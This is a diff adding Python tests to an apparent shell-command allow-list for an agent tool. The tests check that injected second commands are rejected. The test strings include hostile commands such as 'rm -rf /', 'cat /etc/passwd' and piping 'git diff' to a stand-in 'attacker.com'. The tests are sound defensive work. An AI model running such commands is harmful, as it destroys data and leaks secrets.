@@ -70,6 +70,43 @@ def test_unknown_command_blocked() -> None:
     assert is_command_allowed("some-random-tool --flag") is False
 
 
+# --- Shell metacharacter injection tests ---
+
+
+def test_blocked_backtick_injection() -> None:
+    assert is_command_allowed("git status `curl evil.com`") is False
+    assert is_command_allowed("pytest `rm -rf /`") is False
+
+
+def test_blocked_command_substitution() -> None:
+    assert is_command_allowed("git status $(curl evil.com)") is False
+    assert is_command_allowed("pytest $(cat /etc/passwd)") is False
+
+
+def test_blocked_semicolon_chaining() -> None:
+    assert is_command_allowed("pytest; rm -rf /") is False
+    assert is_command_allowed("git status; curl evil.com") is False
+
+
+def test_blocked_pipe_injection() -> None:
+    assert is_command_allowed("git diff | curl attacker.com") is False
+    assert is_command_allowed("pytest | tee /tmp/leak") is False
+
+
+def test_blocked_and_or_chaining() -> None:
+    assert is_command_allowed("pytest && curl evil.com") is False
+    assert is_command_allowed("git status || rm -rf /") is False
+
+
+def test_blocked_output_redirection() -> None:
+    assert is_command_allowed("git log > /tmp/secrets") is False
+    assert is_command_allowed("pytest < /dev/null") is False
+
+
+def test_blocked_newline_injection() -> None:
+    assert is_command_allowed("git status\ncurl evil.com") is False
+
+
 # --- SafeShellTool execution tests ---
 
 
